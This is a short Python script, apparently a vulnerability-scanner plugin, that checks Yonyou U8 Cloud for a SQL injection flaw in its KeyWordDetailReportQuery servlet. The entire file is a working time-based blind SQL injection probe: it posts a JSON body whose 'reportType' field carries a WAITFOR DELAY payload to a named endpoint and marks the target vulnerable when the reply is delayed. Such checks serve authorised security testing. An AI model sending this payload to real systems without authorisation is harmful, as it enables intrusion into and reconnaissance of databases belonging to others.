import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友U8_cloud_KeyWordDetailReportQuery_SQL注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)',
        'Connection':'close'
    }
    data = '''{"reportType":"';WAITFOR DELAY '0:0:5'--","usercode":"18701014496","keyword":[{"keywordPk":"1","keywordValue":"1","keywordIndex":1}]}'''
    vurl = urllib.parse.urljoin(url, "/servlet/~iufo/nc.itf.iufo.mobilereport.data.KeyWordDetailReportQuery")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200 and 'true' in response.text and response.elapsed.total_seconds() > 5:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult